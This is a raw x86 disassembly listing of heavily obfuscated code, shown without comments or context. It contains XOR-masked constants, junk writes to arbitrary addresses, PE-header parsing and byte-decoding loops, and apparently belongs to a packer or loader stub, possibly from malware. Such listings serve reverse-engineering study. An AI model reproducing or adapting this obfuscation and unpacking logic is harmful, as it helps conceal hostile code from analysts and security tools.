  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
